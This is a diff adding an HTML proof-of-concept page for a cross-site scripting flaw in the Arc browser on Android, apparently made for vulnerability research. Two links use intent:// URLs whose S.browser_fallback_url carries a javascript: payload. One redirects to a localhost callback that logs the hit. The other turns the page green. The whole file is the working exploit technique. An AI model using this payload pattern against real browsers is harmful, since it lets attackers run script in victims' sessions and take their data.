@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Arc XSS PoC v8</title></head>
+<body style="padding:20px;font-size:16px;background:white;">
+<h2>Arc browser_fallback_url XSS PoC v8</h2>
+<p id="s" style="color:green;font-weight:bold;">Loaded OK</p>
+<hr>
+<p style="font-size:12px;">
+  Fix: S.browser_fallback_url (Android String extra type prefix)<br>
+  Payload: <code>javascript:location='http://localhost:8080/xss_callback'</code><br>
+  Intent.parseUri needs S. prefix to read String extras correctly.
+</p>
+<br>
+<a id="x1" style="font-size:22px;display:block;padding:25px;background:#ccf;color:blue;text-decoration:none;"
+   href="intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://localhost:8080/xss_callback';end">
+  &#9654; TAP HERE then DENY (v8)
+</a>
+<br>
+<a id="x2" style="font-size:20px;display:block;padding:20px;background:#fdd;color:darkred;text-decoration:none;"
+   href="intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:document.body.style.background='lime';end">
+  &#9654; TAP HERE then DENY (visual - turns green)
+</a>
+<br>
+<p style="font-size:11px;color:gray;">
+  After Deny on link 1: server at localhost:8080 logs xss_callback request<br>
+  After Deny on link 2: page background turns lime green (visual proof)
+</p>
+<script>document.getElementById('s').innerText='Loaded: '+location.href;</script>
+</body>
+</html>
